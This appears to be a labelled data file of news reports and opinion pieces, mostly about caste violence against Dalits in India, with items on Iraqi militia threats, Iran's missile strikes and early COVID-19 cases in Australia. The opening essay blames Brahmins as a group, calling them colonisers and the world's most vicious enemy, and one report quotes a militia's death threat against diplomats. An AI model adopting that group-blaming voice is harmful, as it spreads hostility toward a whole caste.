0,"The story of Bhanwar Meghwanshi, a Dalit youth who was associated with the RSS as a Karsevak, is one of breaking free from the mental colonisation by the Brahmins through the RSS. His fight against the Sangh, after having experienced their agenda against minorities first-hand, is primarily shaped by the intellectual quest for his history, and his vision to resurrect the history of Dalits, which has been appropriated by the RSS. In 1925, India stood at a 22 year-long-distance from its 'independence' from its colonisers, the British. But for the Dalits, the meaning of freedom was incomplete without the community breaking away from the clutches of Brahmanism. For them, the ‘real’ colonisation constituted the rules and diktats of Brahmanical society (caste system), under which they were treated as outcasts. For them, the real colonisers were and have always been Brahmins. Time and again, their literature speaks this truth. From the year 1925, as the decline of British rule started becoming a conceivable reality, the plan to colonise Dalits and consequently other lower castes, including Adivasis, was set in motion with the birth of the Rashtriya Swayamsevak Sangh (RSS). What had pushed the need for RSS, as felt by Brahmins, was the threat to their dominance in an independent nation, imagined on democratic, secular, and just principles, as prescribed by the Indian Constitution. From the beginning, the agenda of the RSS was to bring all Dalits, Adivasis, and other lower caste communities under the umbrella of 'Hinduism'. These marginalised communities, however, had their own histories, deities, cultures, languages, and ideas of life. The RSS’s function was to examine and uproot said communities from their origins of being and belonging, and construct a new history for them that must support the dominance of Brahmins. Consequently, said upper-caste dominant community is now suddenly feeling threatened by the liberty, equality and fraternity constitutionally bestowed upon each citizen of the bygone-British India. Once you are uprooted from your history, and a new history built by the dominant caste is imposed on you, you are bound to hate your own kith and kin. While the British coloniser exploits your labour, the Brahmin coloniser exploits your history. With labour gone, you are filled with rage; but with history gone, you are filled with confusion. Bhanwar Meghwanshi. Facebook/bm075 This new history is constructed around myths concocted by Brahmins, in which you are given a place in the ‘national imagination’, but in disguise. What now compels the Dalit, the Adivasi, and the lower caste youth to be a part of it is an infatuation of patriotism, a newly found enemy to accuse, fiery speeches, rhetoric of hate, and the ‘divine’ idea of working for the motherland, or the 'matrubhoomi'. In his book The Wretched of the Earth, post-colonial theorist and philosopher Frantz Fanon explains that the ""youth of a colonised country, growing up in an atmosphere of shot and fire, may well make a mock of, and does not hesitate to pour scorn upon the zombies of his ancestors, the horses with two heads, the dead who rise again and the djinns who rush into your body while you yawn.” The story of Bhanwar Meghwanshi, a Dalit youth who was associated with the RSS as a Karsevak, elucidates what Fanon tried to explain. But his account, as told in his book I Could Not Be Hindu: The Story of a Dalit in the RSS, is also one of breaking free from the mental colonisation by the Brahmins through the RSS. When your body is used for its labor to spread vicious propaganda, but you are rejected as a mind and a human being with dignity, it then generates strong repulsion for the propaganda you so far dedicated your life to. This experience is curiously revealing in a caste-based society, and one doesn't 'understand' the gravity of caste discrimination unless is it 'felt' or 'experienced'. In case of the young Bhanwar Meghwanshi, the RSS had been an organisation with almost a sacred vision: the creation of the 'Hindu Rashtra'. Through the propaganda, he was raised through his youth and made to feel like a ‘proud’ Hindu. It was only when the food from his home was refused and thrown away by upper caste-Brahmin Swayamsewaks, that he came to taste the poison of caste and discrimination in their entirety — the founding principle of the 'Hindu Rashtra' and the RSS. About this, he dejectedly writes: “For the first time in my life that day, I stepped aside from my Hindu identity and started seeing the world like a person from a lower caste. My troubled thoughts kept me awake all night, a night that felt endless.” Through his stint in the RSS, he was raised as a proud Hindu. However, later, he was viciously rejected as a Dalit; as the one unabatedly questioning the myths fed by the RSS to innocent Dalits, Adivasis and lower caste youth. There's another instance in which his aspirations to become an RSS Pracharak was mutilated by asinine, baseless responses from Savarna leaders, and which revealed to him the hypocrisy of the organisation. This is exactly where we understand the functioning of caste in India. Thus far, the youth of the country across castes, reeling under Brahmin colonisation, was being manipulated by mythical and baseless answers from the RSS, which constantly preached about being an 'Other Superior', while simultaneously being made to feel exploited by enemies of other religions. Youth in India, scattered across hundreds of castes and never sharing a monolithic history, is now made to feel a 'proud' Hindu. Meghwanshi's years in the RSS reveal this trajectory of creation of a new identity, which is then used to mobilise people as a singular force, and propagate the agenda of Brahmins. In a broader sense, after his bitter experience of being exploited by the RSS, he goes on to open up a dialogue with other Dalits from the organisation, only to realise that his distinct understanding of the prejudiced and vicious ways of the RSS is also shared by many from these castes. He felt he is not alone, when it comes to being cheated by the Sangh. He also discovers that discrimination in the RSS is not limited to him, but is a norm practiced in terms of treating people from marginalised and lower caste communities. Though many of them did not talk about their agonies, his comprehension of the RSS is shared by many. He says: “For the first time I saw that this was not my personal pain, but that of every swayamsevak of my community. The difference was that they were willing to accept it quietly, and I was not.” Bhanwar Meghwanshi. Facebook/bm075 This, in turn, has given birth to a rebel within him. A Dalit, who's experienced first-hand the agenda of the RSS and its lethality for Dalits, Adivasis and other lower caste communities, decided to fight against it. This fight is primarily shaped by the intellectual quest for his history, his vision to resurrect the history of Dalits, which is appropriated by the RSS, and making people aware of the scope of acquiring dignity and a human personality that is guaranteed by the Constitution of India. While facing countless threats from the RSS as he works tirelessly to fulfil Ambedkar, Phule, Kabir, and the Buddha's visions, he, however, does not fall prey to regressive positions. But despite all of this, a vision of the world rooted in love seems like a definite possibility to him, as he invokes Kabir while writing about the idea of love in his life: “Of course, life is not simple, nothing is as straightforward as it might appear on the surface, there are ups and downs. It has sometimes felt as if we are life partners only in name, but the two and a half letters that Kabir says make up the word prem (dhai aakhar prem ka) - this love has always survived every trial. My life with Prem, my marriage to her, has taught me that at any point in life one could meet someone, at any point lose someone, one never knows. It is all a matter of fortuity. But I am grateful for the countless blessings in my life, and my heartfelt desire is that there comes a day when the words ‘love’ and ‘life’ become synonymous.” Who else could understand the profound and true meaning of revolution, than the one whose idea of life is synonymous to love? — That too while fighting the most vicious enemy in the world: the colonisers of the mind — the Brahmins, the RSS.

0,"Support SouthFront A newly-established Iraqi armed group identifying itself as Qabdat al-Hudaa (QH) has threatened American and British ambassadors in the country’s capital, Baghdad. In a statement released on April 9, the mysterious group called on both ambassadors to flee from the country within 48 hours threateniing to kill them. “According to the information, which we received, US forces of evil are planning to carry out an attack against the blessed Islamic resistance factions and the Iraqi people. So we tell them that out eyes are monitoring you everywhere… and to the US and British ambassadors in Baghdad [we say] if you don’t leave Iraq within 48 hours, you will be leaving dead [in body bags]. Forewarned is forearmed,” the statement reads. Click to see full-size image. The new faction is named after a group of Shiite scholars who were executed by the Saddam regime in 1974. The five scholars, headed by al-Arif al-Busri, were among the very first leaders of the Islamic Dawa Party that later supported the Islamic Revolution in Iran. QH is one of a few armed factions which were formed or emerged following the assassination of Popular Mobilization Units Deputy Commander Abu Mahdi al-Muhandis and Iran’s Quds Force Commander Maj. Gen. Qassam Soleimani in January 2020. Usbat al-Tha’ireen (UT), the faction that claimed responsibility for the March 11 rocket attack on the US-operated military base Camp Taji, was among the first groups that became active after the incident. Another group is ‘Ashab al-Kahf (AK). This group allegedly attacked a military convoy of U.S. forces in Saladin earlier this week. Other large Shiite armed group like Kata’ib Hezbollah (KH) have been threatening U.S. forces for a while now. However, they are yet to take any direct military action. The U.S.-led coalition has taken these threats seriously. It has withdrawn a large part of its troops and redeployed others to well-protected bases. These measures will not likely be very successful, if Iraqi factions decide to go for an “open war” with U.S. forces.

0," A 19-year-old Dalit woman is battling for her life in a hospital after she was dragged into a field, gang-raped and brutally attacked, allegedly by a group of men in Uttar Pradesh’s Hathras district. Her tongue was cut off and her spinal cord and neck were damaged because she was strangled with her chunni. Four accused have reportedly been arrested in connection with the incident. The incident took place on 14 September. Following the incident, three accused were arrested after the woman regained consciousness in an Aligarh hospital on 23 September and gave her statement to the police. The fourth accused was arrested on 26 September, Hathras SP Vikrant Vir confirmed. “My mother, sister and elder brother had gone to a field to get some grass. My brother went home earlier with a large bundle of grass, while my mother and sister continued to cut them. There was bajra crop on either side of where they were. Soon, both women became a little distant from each other. Four-five people came from behind, they threw my sister’s dupatta around her neck and dragged her inside the bajra field,” the woman’s brother told NDTV. “My mother realised she was missing and went looking for her. My sister was found unconscious. They had raped her,” he added. The woman’s family, however, alleged the police did not help them initially and only acted after outrage over the case. The police have denied the allegation. The incident allegedly happened at a village in the district, some 200 km from Delhi. “The police did not help us initially; they did not take quick action. They acted only after four-five days,” woman’s brother added. The Uttar Pradesh Police said they acted fast in the case. “We have registered a case under (IPC) sections of gangrape, attempt to murder and SC/ST Act. The accused persons are being interrogated. We have compiled all the evidence from the spot and are in the process of filing a chargesheet. We want the family to get justice and will be submitting all documents in fast-track court for immediate action,” Vir said. Your email address will not be published.

0,"Ballia (Uttar Pradesh), Feb 17 (IANS): A Dalit youth was attacked with a trident by four youths for touching food without washing his hands in Uttar Pradesh's Ballia district. The incident took place in the Dokati village on Saturday night where a 'bhandara' (community feast) was being held and the entire village was invited to the function. Upendra Ram, 30, who works in a coal shop, came to the function straight from the shop, and had coal stains on his hands. As soon as he picked up the food for himself, the four youths objected to his picking up the food without washing his hands. A verbal spat soon turned ugly and the youth attacked him with hot tongs.  As Ram fell to the ground, one of the youths picked up a trident and attacked him with it. Ram has been admitted to a hospital in a critical condition. The police are yet to register a case and arrest the accused. A police official said that no complaint had been filed in the matter. CM Aditya Bisht is relaxing after Delhi election campaign. After that, he has to prepare for high power Bihar election! CM Yogi's model of cleanliness and administration... India has to go a long way to abolish untouchability like rampant evil practices. Attacking dalit or anyone for no fault is grave crime!Evil practices such as racial abuses are prevalent in developed countries as well but to a far lesser level.It's moral duty of all of us, our society, political parties and Govt to continuously educate the masses against such practices and take stringent deterrent actions on the perpetrators to prevent occurrence of such evil practices. Frustrated by vedic culture the Dravidian Bassvsnna stood against social practices before 900 years back And at present Dravidian are attacked frequently. Periyar also social reform er from Dravidian and both are from Karnataka While Corona virus has become an international threat, washing your hands is important! I sometimes wonder, with so many centuries of boasting of Sanatana Dharma, why no one has tried to eradicate this untouchability.Whenever Hindu Jagarana Vedike holds Hindu Sammelana, they say 'Navella Hindu, Navella Ondu' but in reality the lower castes in Hindus know that they will never be one.

However, Bulgarians firmly give the government poor marks for its support during the crisis – from 3.3 in April down to 2.9 out of 10 in July. Poland is the only country where trust in the government is lower than it is in Bulgaria – 2.6-2.4, though trust in the EU is considerably higher – 5.1-6.2. The survey is by the EU agency Eurofound which focuses on societal change and trust in institutions.

0,"by Kinita Schripsema | Sep 16, 2020 | General PODCAST LINK: https://podcasts.apple.com/us/podcast/growing-forward-together/id1510373513 Since I am passionate about promoting inclusion in a variety of ways, today’s dialogue and interview is about the “Caste System” and it’s roots in the Hindu religion. Because it is a system that stresses division, I thought I would interview a dear friend who is from a different caste than me to share how we choose to live with reconciliation deep in our hearts!! What is Caste? Caste is an institutionalized spiritual structure of oppression that affects over 1 billion people across the world. At birth, every child inherits his or her ancestor’s caste, through the Hindu varna system, which determines their social status and assigns them “spiritual purity”. This inherited status can determine where you live, what you eat and who you marry, and even where you can be buried or cremated when you die. It is also referred to as the “Heredity Principle” and Hindus believe it to be eternal. Caste also determines access to opportunities for employment and ownership of resources. Many individuals actively participate in “Manual scavenging”. This is a euphemistic name for the Caste occupation of picking up fecal and other sewage with bare hands, and it is forced onto Dalit communities and continues to still be pervasive across South Asia. Throughout South Asia, there is also a high rate of caste-based violence both physically and sexually. The caste system divides Hindus into four main categories – Brahmins, Kshatriyas, Vaishyas and the Shudras. Many believe that the groups originated from Brahma, the Hindu God of creation.  Meet my friend My guest today is a dear friend and brother, Mr. Vaibhav Moon. He has an MBA and is the Executive Director at Udhhar (meaning “lifted up”). Udhhar is a Non-profit organization serving the rag pickers, farmers, tribal and people in crisis in Nagpur, India. As the title of this post suggests we have a friendship and service relationship. My ancestors are from the Brahmin caste and my guest and dear friend was born into the Dalit caste. According to cultural and religious design, the two should never mix or associate. When asked “how did you choose to work with the rag pickers?” He said, “I went to them since they believe they can’t come to us because of the caste divisions. My work should lead to reconciliation”. And that, my friends, is what unites us.  Feel free to contact Vaibhav directly through the Udhhar website or at his personal email listed below.

0,"The group also issued a warning to American allies Iran's Islamic Revolutionary Guard Corps has reportedly issued a statement claiming responsibility for missile strikes hitting Iraqi airbases housing U.S. troops on Friday. According to a translation provided by Axios, the IRGC released a statement following the attacks, saying, ""The brave soldiers of IRGC's aerospace unit have launched a successful attack with tens of ballistic missiles on Al Assad military base in the name of martyr Gen. Qasem Soleimani...We warn all allied countries of the U.S. that if attacks are launched from bases in their countries on Iran, they will be a target of military retaliation."" The IRGC was expected to retaliate after President Donald Trump ordered the airstrike that killed Soleimani last week. Soleimani, a known terrorist, was head of the IRGC's elite Quds Force. Sen. Marco Rubio appeared to confirm late Friday that the attack on U.S. facilities in Iraq was, indeed, sent at the hands of the IRGC, tweeting, ""I have been briefed on this evenings direct attack by the #IRGC which launched ballistic missiles from Iran's territory against two Iraqi bases hosting coalition forces.

0,"A Dalit family in Bihar’s Kishanganj district has accused the local Bhim Army unit of attacking them for their beliefs, desecrating a temple as they object to their reverence for Hindu deities and saffron flags. According to a report by Swarajya, a police case has been filed by both sides (the Bhim Army side and the temple side) in Kashganj police station. The first FIR was filed by a member of the Bhim Army. 27-year-old Deepchand Ravidas, in his statement to the police, said that around 3.30 pm on May 13, a group of men attacked him with a sword near a Shiva temple on Thakurbari road. The statement also says the group attacked his sister too when she came to his rescue. On the basis of his complaint, the Kashganj police booked 8 members, including members of the Dalit family namely, 55-year-old Gyani Ram and three of his four sons — Santosh Ram, Shyam Sundar Ram and Birendra Ram. On the other side, 28-year-old Santosh Ram in his FIR alleged that on May 13 at around 4:30 pm a group of men entered the Shiva temple (that’s adjoining their house) and tried to desecrate it. The group entered the premises with iron rods, bricks and stones and demanded the temple be removed. They also tried to break the Shivling. The report by Swarajya says that when Santosh and his family objected, the group attacked them with a motive of murder. The statement read that the Bhim Army group attacked Santosh’s father, brothers and sisters. Based on this statement, the police booked four named persons and other unidentified persons, under the same IPC sections as in the first FIR.  Birendra Ram, who has been named as accused in the FIR lodged by members of the Bhim Army rejected the charges imposed on him and his family member’s and recalled how he and his family were often mocked by the members of the Bhim Army for their belief in Hindu gods. “We are BJP voters. They don’t like this. They constantly tell us to join their outfit. They demand we stop worshipping Hindu deities and worship only Babasaheb (Bhimrao Ramji Ambedkar),” Birendra says. Birendra alleged that on May 10 a group entered the temple and told everyone to remove the saffron flag bearing an image of Bajrang Bali installed there. An old animosity culminated into violence recalls Birendra, who’s two brothers, Santosh and Guddu, are recovering in hospital. Birendra also says that once in the past, during a discussion the local Bhim Army members had insisted that the shivling be broken to show that “I (Birendra) don’t support any false gods. I grew really angry and left the discussion. I said that if that was the condition, I would never support his group again,” he recalls. Birendra furthers how on Ambedkar’s birthday on April 14, the Bhim Army members had gathered along with several Muslim men in a room adjoining the temple to celebrate Ambedkar’s birthday. “They had brought many Muslim men from outside. We suggested that they should shift the celebrations to the nearby community hall, but they, in turn, abused us and told us to replace the idols in the temple with that of Ambedkar,” Birendra says, adding that “an ugly spat broke out.”  “All this has now culminated in violence. We have been thrashed for our religious beliefs,” he says. Commenting on the case, investigating officer Arvind Kumar Yadav told this correspondent over the phone that two persons from each side have been arrested so far. “You know how it is in such scuffles, both sides give complaints. The truth will come out only in the probe. That is going on,” Yadav said and declined to speak more.

The dead body of 35-year-old Mintradevi Baitha was found in a field some 400 meters away from her house on Sunday evening. According to the police, she was killed on Sunday evening just a few minutes before they received the information of the murder at around 6:15 p.m. ""The woman was found strangled with a sari when we first saw her dead body in the sight,"" said SP Raviraj Khadka of District Police Office, Rautahat. Baitha belonged to a simple family. Her husband works in a landfill area in Kathmandu. She had left her house in the evening in order to collect grass from the field to feed her livestock. Villagers, who saw her body, had quickly informed the police. ""There are bruises all over her body,"" said SP Khadka, who is also the chief at the office. Police also spotted littered leaves and demolished sugarcane plants at the site. This has led to a suspicion that Baitha might have been killed after being raped, ""But there is no evidence yet to prove that. We have to go through her autopsy report before making any such conclusion,"" said Khadka. According to Khadka, Baitha's body has been brought to Tribhuvan University Teaching Hospital in Kathmandu for postmortem. No one has been arrested in connection with the murder yet as police investigations are still underway. People in Rautahat are in the state of panic as this is the second murder in less than two weeks in the district. A few weeks ago, a priest from Madhavnarayan Municipality-2 in Rautahat was shot to death.

0,"Representative image. Former Congress MLA Munnalal Goyal was on Tuesday assaulted by locals when he visited the family of a young Dalit activist who was murdered in Gwalior the day before. Nineteen-year-old Paras Jauhri was attacked by armed assailants and murdered on Monday night inside his home in Footi Colony in Jatav Mohalla. Local media reported that young activist who was in second year of BA was a witness in a case of vandalisation of Dalit icon BR Ambedkar’s statue. Goyal said he was attacked when he had gone to visit the family, whose residence falls in his erstwhile constituency, to offer condolences. Goyal, who represented Gwalior East in the assembly, is considered to be a staunch loyalist of Jyotiraditya Scindia and left the Congress for the BJP shortly after the erstwhile royal’s exit from the grand old party. Goyal had later even claimed that the Congress was trying to “eliminate” him. He has alleged that when he reached the police station, five to 10 people pelted stones on his four-wheeler, damaging the vehicle. Goyal sustained injuries on his face and leg. He was taken to a private hospital for treatment. Though Goyal did not lodge any complaint with the police, the latter are trying to zero in on the attackers with the help of CCTV footage. Later in the afternoon, Goyal appeared before the media and accused the Congress, saying it was coming after him because of his “growing influence” in the Dalit community. “They can inflict as many attacks as they want, but I will continue to serve the public,” he said. Hitting back, Congress leader and Dalit activist Devashish Jararia said Goyal hadn’t gone to express condolence to the family. “Goyal went there to ask the family not to name anyone in the FIR and settle the matter, which enraged locals,” Jararia told News18, adding that the bereaved family was protesting with the body of the deceased at the police station. According to the police, Jauhri’s family said that he was studying on the first floor of the house and rushed downstairs late at night with multiple wounds. His mother said she had seen some locals flee after the assault. The 19year-old was unable to speak because of his and was declared brought dead at a hospital, his family said. The family has named five locals, while two others are also suspects in the case. Police had lodged a case into the murder, and locals gathered at the Sirole police station on Tuesday morning. - With inputs from Sushil Kaushik in Gwalior"

In a fresh case, a Dalit groom, who is serving in the Indian Army, was not allowed to ride a mare on his wedding day in Gujarat. The groom and the wedding party (baraat) was pelted with stones when it was proceeding to the wedding venue in the state's Banaskantha district. What was shocking was that the miscreants from another community attacked the wedding party despite police protection being provided to the groom. Open threats to Dalit family According to a report in Indian Express, the incident took place on January 16 (Sunday) at Sharifda village when the 22-year-old groom identified as Akash Kumar Koitiya began his wedding procession. Koitiya has just finished his training with the military police and was scheduled to deploy in the Meerut district of Uttar Pradesh. The jawan was on leave for his wedding. The groom's family said they had received threats from the Thakor Koli community not to pass the wedding procession through the village if the jawan rode a mare. ""After threats, we had requested police to give us protection. Police gave us 6-7 personnel for the security of the wedding procession. As we started to move, some people started to throw stones at us. The groom barely escaped injuries and was rushed to a police van. However, three persons including two women sustained injuries in the stone-pelting,"" said Vijay Koitita, the groom's brother. The groom's family had received threats in advance from the upper caste if the youth rode the mare (Representative image) Police protection to groom Vijay is also an army man and is currently deployed in Jammu and Kashmir. After the attack, a number of policemen were rushed to the village. ""A contingent of 50-60 policemen was sent to accompany the wedding procession to the bride's village that was in Sundha area of Palanpur city. Later, the wedding passed off without any incident,"" said Dalpat Bhatia, a Dalit rights activist. Meanwhile, police said they have booked 11 persons from the Thakor Koli community after the complaint by the groom's family. The case was filed at Gadh police station. According to police, the accused have been identified as Tushar Koli, Deepak Koli, Bhavan Koli, Vinod, Deepak Ishwar, Jeet, Manju, Ramaji, Bai Koli, Senaji, Shivaji Koli."

New Delhi | Published: 19:50, Sep 29,2020 A Dalit teenager allegedly raped by four upper-caste men died from injuries on Tuesday, sparking outrage from Indian activists, politicians and Bollywood stars. India’s 200 million low-caste ‘untouchable’ Dalits have long faced discrimination and abuse and campaigners say attacks have increased during the COVID-19 pandemic. The 19-year-old girl was brutally assaulted in the northern state of Uttar Pradesh on September 14, according to a complaint filed by the family with the police. The four accused have been arrested, according to the authorities. Found lying in a pool of blood and paralysed from injuries to her neck and spine, the woman was rushed to a local hospital before being brought to New Delhi on Monday as her condition worsened. ‘She died during the course of treatment on Tuesday morning. We will ensure swift investigation and trial in the case,’ Hathras district police chief Vikrant Vir told AFP. The news comes months after four men were hanged for the brutal gang rape and murder of a student on a bus in Delhi in 2012— a case which came to symbolise the nation’s problem with sexual violence, gaining worldwide notoriety and being turned into a Netflix TV show. Bollywood personalities and women’s rights activists took to social media to condemn this month’s attack. ‘Sad, sad day. How much longer can this be allowed to go on,’ wrote director-producer Farhan Akhtar. Activist Kavita Krishnan said the attack reflected the ‘larger picture of structural violence’ against Dalit women. Priyanka Gandhi, a member of the opposition Congress party, blamed the assault on the deteriorating law-and-order situation in Uttar Pradesh, which is ruled by Prime Minister Narendra Modi’s Bharatiya Janata Party. Women in India are subjected to alarming levels of sexual assaults, irrespective of their caste or class. Nearly 34,000 rapes were reported in the country in 2018, but the figures are considered the tip of the iceberg, with many victims too scared to come forward.

0,"Dalit politics in Bihar has mainly been a politics of negotiation for a “good deal” from mainstream political parties. The “good deal” meant a good bargain from the parties, either in office or in the opposition, in terms of seats in a pre-poll alliance, and share in the government. In return, the transfer of caste and community votes was promised. This politics of negotiation in Bihar proceeded from the period that Kanshi Ram diagnosed as the chamcha age of Dalit politics. In the post-Independence decades, Dalit leaders in the Congress and Janata Party got to share power as representatives of a caste or community. Dalit leaders such as Bhola Paswan Shastri and Ram Sundar Das rose from the grass roots to become chief ministers in Bihar. Both Shastri and Das belonged to mainstream national parties. However, Dalit politicians, who were working in national parties, started to form caste-based parties after the 1980s. The phase of social justice politics in Bihar gave these leaders the capacity and space to float their outfits and, thereby, negotiate better bargains with bigger parties. For instance, Ram Vilas Paswan, who was a leading figure in the anti-Emergency movement and the Janata, founded his own party — the Lok Janshakti Party — in 2000. As Mahadalit politics found resonance in recent years, leaders like Jitan Ram Manjhi, a member of the most marginalised Musahar caste, split from the Janata Dal (United) to form the Hindustani Awam Morcha. However, these parties have not shown any allegiance to ideology — they have effortlessly moved from the NDA to UPA and vice versa to bargain for a better share of seats or ministerial berths. Never have these parties left an alliance or joined one on matters of Dalit empowerment or emancipation. Unlike in UP, Dalit politics in Bihar continue to be dependent on mainstream parties. The Ambedkarite radical consciousness is weaker in the Dalit politics of Bihar and Dalit assertion at the grass roots continues to be weak. The Naxalite movement, which attracted a large number of landless peasants, was the vehicle of Dalit assertion till the 1980s, but the rise of caste and social justice politics led to its marginalisation. The new middle- and upper-class Dalits wedded the slogan of social justice with reservation and employment. This too weakened the Naxalite and communist mobilisations, which were focussed on the issue of land. Opinion | SY Quraishi writes: In Bihar, EC’s challenge: To ensure level playing field in a mostly virtual campaign Another feature of Dalit politics in Bihar is that only the numerically stronger groups among the 22 Dalit castes have become influencers in politics. They alone managed to get representation in government. Dalits constitute about 16 per cent of the state’s population. But only the Dusadh, Chamar, Dhobi, Mushahar communities are visible in power politics. The Dusadhs account for 5-6 per cent of the total population of the state and make up 37 per cent of the Dalit population. Chamars are around 6-7 per cent of the state population and form 39 per cent of the total Dalit population. The Mahadalit castes (19 castes) together are around 4-5 per cent of the state population and are 24 per cent of the Dalits. Musahar, the largest politically-mobilised Mahadalit caste, gained a voice during the Lalu Prasad years. Other Mahadalit castes are numerically small and yet to find visibility in electoral politics. Most of the Dalit leaders of Bihar command support of only their caste and subcaste members. Leaders such as Ram Vilas Paswan, Shyam Rajak and Jitan Ram Manjhi claim that they can transfer votes of their caste. Recently, Rajak, industry minister in the Nitish Kumar government, joined the RJD while Manjhi has moved away from the UPA. Chirag Paswan is putting pressure on the NDA leadership for more seats in the upcoming assembly election. However, previous poll results indicate that these leaders cannot transfer more than 40 per cent of caste votes. At his peak, Ram Vilas Paswan commanded 50 per cent. If these leaders still command political traction, it is because they help the alliance project the perception that it supports the social justice agenda. Also read | Explained: What the EC has said on voting during the Covid-19 pandemic These leaders have also failed to disseminate democratic ideals within their communities and behave like feudal leaders, almost copies of leaders of dominant communities and parties. Their failure in creating emancipatory conditions for marginal communities has led to the fragmentation of Dalit votes, which in turn has weakened Dalit assertion in Bihar.

0,"By Alana Mazzoni and Eliza Mcphee For Daily Mail Australia Published: 19:14 EDT, 26 January 2020 | Updated: 20:05 EDT, 26 January 2020  8 View comments  A 21-year-old Chinese student is likely to become the fifth person in Australia to be infected by the deadly coronavirus, health authorities say. The federal government's chief medical officer Professor Brendan Murphy confirmed the woman is in isolation and had tested positive to the virus in preliminary examinations. 'She is in isolation until the final confirmation. But NSW Health feel she's likely to be the fifth case in the country,' Prof Murphy said. Health authorities are now working to track down people the woman came into contact with and potentially infected. The news comes after three men in New South Wales, aged 43, 53 and 35, and one Victorian man aged in his 50s, caught the deadly disease. A 21-year-old woman has been taken to hospital after fears she may have contracted the deadly coronavirus The virus, which experts fear will 'highly likely' continue to spread in Australia, has so far killed 56 people in China and infected 2,000 people worldwide. Since the outbreak at the end of December, Chinese authorities have placed 56 million people in lockdown - including more than 100 Australian children aged between six months and 16 years old, the ABC reported. Photos taken outside Westmead Hospital on Sunday show a woman wearing a face mask being moved by paramedics with protective gloves, masks and clothing. Prof Murphy said there would likely be more cases in the country. 'There is no cause for general concern,' Prof Murphy said in Melbourne on Sunday. 'I would not be surprised if there are some more cases... it's highly likely that we may see some more. 'We are incredibly well prepared to isolate and deal with that.' Emma Wei, from Melbourne, is trapped in Wuhan with her two children amid China's lockdown Medical staff are seen wearing protective clothing outside a hospital in Wuhan after the coronavirus outbreak NEW SOUTH WALES: 4 Four people in NSW have been diagnosed with coronavirus, including three men and one woman. January 25 January 27 VICTORIA: 4 January 25 January 29 January 30 She is being treated at Royal Melbourne Hospital. February 1 A Melbourne woman aged in her 20s is at home recovering. She returned from Wuhan on January 25 and fell ill two days later. She was not infectious on the flight, and has remained in isolation since being tested. QUEENSLAND: 2 January 29 January 30 SOUTH AUSTRALIA: 2 February 1 A Chinese couple were placed in isolation in a public hospital. The man and a woman both aged 60, were from Wuhan and visiting relatives in South Australia. SA Health said the pair isolated themselves at home when they developed symptoms and awaited the results of the coronavirus test. Australia has raised the travel alert level to 'do not travel' for the city of Wuhan - the epicentre of the outbreak - and for the entire Hubei province. Chief Medical Officer Brendan Murphy says unless people have contact with someone who is unwell and has come from that part of China, there is no need for current concern. In the wake of the rapid spread, Chinese-Australian parents are now desperate for their children to get out of Wuhan in China's Hubei province. Yi Xu is demanding his six-month-old daughter be brought home to Australia. 'The Australian Government needs to follow what the US is doing [and] to charter a plane to evacuate its citizens for emergency,' Mr Xu told the ABC after reports the U.S was using a plane to evacuate Americans from the area. A father from Melbourne, Nathan Wang, said his 11-month-old daughter is stuck in Wuhan with his wife and other child. Mr Wang said his family was struggling to access medical resources. 'I can't even fall asleep. As a father, I was very desperate. I am guilty that all of the risks and pressure were put on my wife alone,' he said. Another Chinese-Australian man said the children who were left stranded in the areas were being cared for by their grandparents. 'They are desperate to get out, because there starts to see a shortage of face masks and other protective supplies,' the man who only wanted to be referred to as John told The Australian. 'Many children are running out of baby formula powders soon,' he said. The Australian government is now considering options to allow Australians in the infected areas to travel. A China Eastern Flight from Wuhan arrives at Sydney International Airport on Thursday where health authorities were screening passengers for coronavirus 'The Government acknowledges the concerns of Australians who are in Hubei Province in China and the concerns of their families and friends,' Foreign Minister Marise Payne said in a statement on Sunday. Once someone has caught the virus it may take between two and 14 days for them to show any symptoms. If and when they do, typical signs include: The vast majority of patients – at least 97 per cent, based on available data – will recover from these without any issues or medical help. In a small group of patients, who seem mainly to be the elderly or those with long-term illnesses, it can lead to pneumonia. Pneumonia is an infection in which the insides of the lungs swell up and fill with fluid. It makes it increasingly difficult to breathe and, if left untreated, can be fatal and suffocate people. 'The Department of Foreign Affairs and Trade is working closely with Chinese authorities and international partners to consider possible assistance with travel for Australians from areas that are affected by Chinese travel restrictions. 'Given the circumstances of the spread of the Coronavirus, Chinese authorities are currently imposing very tight restrictions on all travel from Hubei. We are seeking advice from the Chinese authorities on these restrictions and whether any options are available to international travellers. 'Our Embassy in Beijing and our Consulate in Shanghai are also working with international partners and the Chinese government to determine what support can be given to Australians on the ground.' Authorities are urging anyone who has travelled to the Wuhan region and experienced flu-like symptoms to contact their GP or local emergency department. The patient in Victoria is a Chinese national aged in his 50s who flew to Melbourne on China Southern flight CZ321 from Wuhan via Guangzhou on January 19 on an A380 plane, which can can carry 500 passengers. A passenger wearing a protective mask (pictured) is seen at Sydney Airport on Thursday, as a man in Melbourne is confirmed as the first Australian case of coronavirus He became the first confirmed case of coronavirus in Australia on Saturday morning and is now in quarantined isolation at Monash Hospital in Clayton in Melbourne's east. Earlier on Saturday a baby was rushed from Sydney Airport to hospital for testing and was later discharged cleared of the virus. A Hobart man has tested negative for coronavirus on Sunday after he was admitted to the Royal Hobart Hospital on Saturday with mild respiratory symptoms. The man in his 30s had travelled to China earlier this month and spent time Wuhan, where the coronavirus outbreak began. He contacted a general practitioner with respiratory problems and was admitted into an isolation room in hospital while tests were conducted to rule out the infection. Public Health services identified the man's contacts since returning to Hobart in case he had been identified as carrying the virus. The man has been discharged from hospital after his results showed he was not infected. What is this virus? The virus has been identified as a new type of coronavirus. Coronaviruses are a large family of pathogens, most of which cause mild respiratory infections such as the common cold. But coronaviruses can also be deadly. SARS, or severe acute respiratory syndrome, is caused by a coronavirus and killed hundreds of people in China and Hong Kong in the early 2000s. Can it kill? Yes. 56 people have so far died after testing positive for the virus. What are the symptoms? Its symptoms are typically a fever, cough and trouble breathing, but some patients have developed pneumonia, a potentially life-threatening infection that causes inflammation of the small air sacs in the lungs. People carrying the novel coronavirus may only have mild symptoms, such as a sore throat. They may assume they have a common cold and not seek medical attention, experts fear. How is it detected? The virus's genetic sequencing was released by scientists in China to the rest of the world to enable other countries to quickly diagnose potential new cases. This helps other countries respond quickly to disease outbreaks. To contain the virus, airports are detecting infected people with temperature checks. But as with every virus, it has an incubation period, meaning detection is not always possible because symptoms have not appeared yet. How did it start and spread? The first cases identified were among people connected to the Huanan Seafood Wholesale Market in Wuhan. Cases have since been identified elsewhere which could have been spread through human-to-human transmission. What are countries doing to prevent the spread? Countries in Asia have stepped up airport surveillance. They include Japan, South Korea, Thailand, Hong Kong, Indonesia, Malaysia and Philippines. Australia and the US are also screening patients for a high temperature, and the UK announced it will screen passengers returning from Wuhan. 